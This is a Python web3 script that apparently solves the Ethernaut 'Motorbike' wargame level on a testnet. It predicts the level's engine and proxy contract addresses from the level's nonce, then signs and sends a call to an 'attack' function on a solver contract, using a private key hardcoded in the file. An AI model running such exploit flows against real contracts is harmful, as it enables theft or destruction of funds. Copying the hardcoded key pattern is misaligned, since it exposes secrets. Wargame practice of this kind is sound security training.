from web3 import Web3
from eth_account.account import Account, SignedTransaction
from abis import *
import rlp

provider_url = "https://sepolia-rollup.arbitrum.io/rpc"
w3 = Web3(Web3.HTTPProvider(provider_url))

player_private_key = "0x4c93e99df964f043149b68ae9d6c994e684f0cacec41becbd5da0a082629684c"
player_account = w3.eth.account.from_key(player_private_key)

player_nonce = w3.eth.get_transaction_count(player_account.address)

ethernaut_address = "0xD991431D8b033ddCb84dAD257f4821E9d5b38C33"
level_address = "0xf686cF9816bEf8030e03712a7229C5daa8150C0F"
solver_address = "0xE239cC21c66bf2D2A609DcC0253A089DB87ffF48"

level_nonce = w3.eth.get_transaction_count(level_address)

solver_instance = w3.eth.contract(address=solver_address, abi=solver_abi)

engine_addr = "0x"+Web3.keccak(rlp.encode([bytes.fromhex(level_address[2:]), level_nonce])).hex()[-40:]
motorbike_addr = "0x"+Web3.keccak(rlp.encode([bytes.fromhex(level_address[2:]), level_nonce+1])).hex()[-40:]

print(engine_addr)
print(motorbike_addr)
func = getattr(solver_instance.functions, 'attack')(Web3.to_checksum_address(engine_addr), Web3.to_checksum_address(motorbike_addr))
tx = func.build_transaction({'nonce': w3.eth.get_transaction_count(player_account.address), 'value': 0, 'gas': 1000000, 'gasPrice': w3.eth.gas_price})
sign_tx: SignedTransaction = Account.sign_transaction(tx, player_private_key)
tx_hash = w3.eth.send_raw_transaction(sign_tx.raw_transaction)

